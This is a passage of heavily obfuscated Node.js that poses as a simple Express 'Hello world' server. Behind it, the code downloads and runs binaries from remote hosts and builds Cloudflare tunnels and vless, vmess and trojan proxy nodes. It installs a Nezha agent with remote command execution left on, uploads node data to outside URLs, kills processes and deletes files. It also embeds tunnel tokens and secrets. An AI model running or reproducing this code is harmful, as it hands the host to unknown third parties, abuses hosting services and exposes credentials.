axios[_0x2e596d(0x118)](_0x2e596d(_0x24b875._0x3d9035),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2e596d(_0x24b875._0x29f545)}});return console[_0x2e596d(0xdf)](_0x2e596d(0x183)),_0x3f58be;}catch(_0x48bdc5){return console['error'](_0x2e596d(0x12b)+_0x48bdc5['message']),null;}}async function startserver(){const _0x45e24b=_0xfc54cc;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x367376){console['error'](_0x45e24b(0x141),_0x367376);}}startserver()[_0xfc54cc(0x156)](_0x22f177=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x22f177);}),app[_0xfc54cc(0x173)](PORT,()=>console[_0xfc54cc(0xdf)](_0xfc54cc(0xcf)+PORT+'!'));function _0x3219(){const _0x48f998=['base64','/dev/null','fileUrl','rm\x20-rf\x20','basename','/vless-argo','&fp=firefox&type=ws&host=','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','true','env','random','xtls-rprx-vision','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','http\x20server\x20is\x20running\x20on\x20port:','58499FSTDKq','https://arm64.ssss.nyc.mn/v1','CFIP','php\x20running\x20error:\x20','response','charAt','nginx.wsdjw.dpdns.org:80','Empowerment\x20success\x20for\x20','pkill\x20-f\x20\x22[','tunnel.json','?encryption=none&security=tls&sni=','false','Error\x20reading\x20boot.log:','ARGO_PORT','264DCXOZI','log','/vmess-argo?ed=2560','map','tcp','22971uyQeFv','length','/api/add-subscriptions','Unknown','eyJhIjoiNzkzMzA2M2M0ZjUwZTk5OWYzODJhNGIzMWFiNTBmMjIiLCJ0IjoiZjMzMzc4N2UtZDQ3Zi00NDBlLThiNzEtYmU1YjViOGM1MjM1IiwicyI6Ik9EaGlOak16TmprdE1EQmtPUzAwTjJNNUxUZ3lOekF0TnpVeU56Z3dNbVZoTWpVMiJ9','\x20-s\x20','unshift','readFileSync','489092TleJgU','org','https://arm64.ssss.nyc.mn/bot','443','path','data','\x22\x20>\x20/dev/null\x202>&1','match','finish','\x20failed:\x20','mkdirSync','arch','sub.txt','http://ip-api.com/json/','https://amd64.ssss.nyc.mn/web','\x20is\x20created','\x20>/dev/null\x202>&1','AUTO_ACCESS','Error\x20downloading\x20files:','clawjp.djw008.dpdns.org','clawjp','text/plain;\x20charset=utf-8','forEach','win32','set','config.json','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','toString','filter','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','vmess','TunnelSecret','quic','taskkill\x20/f\x20/im\x20','\x0a\x20\x20tunnel:\x20','none','status','application/json','\x20-c\x20','/vmess-argo','\x20>\x20nul\x202>&1','then','http','\x0a\x20\x20\x20\x20','from','post','\x0a\x0atrojan://','\x20-p\x20','axios','/config.json\x20>/dev/null\x202>&1\x20&','&path=%2Ftrojan-argo%3Fed%3D2560#','trojan','/trojan-argo','ARGO_AUTH','Error\x20executing\x20command:\x20','Download\x20','del\x20/f\x20/q\x20','./tmp','72154HSWYOt','&path=%2Fvless-argo%3Fed%3D2560#','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0a\x20\x20credentials-file:\x20','writeFileSync','npm\x20running\x20error:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','ArgoDomain:','NEZHA_KEY','Nodes\x20uploaded\x20successfully','NEZHA_PORT','2096','2083','clear','freedom','split','get','8443','2087','stream','App\x20is\x20running','https://ipapi.co/json/','boot.log','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0aclient_secret:\x20','UPLOAD_URL','all','blackhole','Error\x20in\x20startserver:','nohup\x20','floor','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','createWriteStream','push','statSync','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','sub','join','tls','amd','message','cdns.doon.eu.org','https://amd64.ssss.nyc.mn/v1','https+local://8.8.8.8/dns-query','list.txt','Content-Type','\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','SUB_PATH','catch','tunnel.yml','FILE_PATH','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','existsSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','unlinkSync','readdirSync','child_process','\x0a\x0avmess://','2053','arm64','express','UUID','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','substring','\x20>/dev/null\x202>&1\x20&','has','Hello\x20world!','127.0.0.1','\x20is\x20running','error','stringify','9AgVici','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://amd64.ssss.nyc.mn/bot','test','https://oooo.serv00.net/add-url','bO4rS1SFumZcuWUfqZNZ9sJ0mdcj4zZR','listen','1814058iWkFkl','send','https://arm64.ssss.nyc.mn/web','chmod','3Dkezgl','\x20already\x20exists','abcdefghijklmnopqrstuvwxyz','web\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/agent','utf-8','includes','Skipping\x20adding\x20automatic\x20access\x20task','block','ARGO_DOMAIN:','PROJECT_URL','automatic\x20access\x20task\x20added\x20successfully','b2d964dd-6f49-4af3-982f-5c5520e633ad','vless','SERVER_PORT','2189575KbUaMb','arm','Empowerment\x20failed\x20for\x20','/tunnel.yml\x20run','3665110TSmVBr'];_0x3219=function(){return _0x48f998;};return _0x3219();}
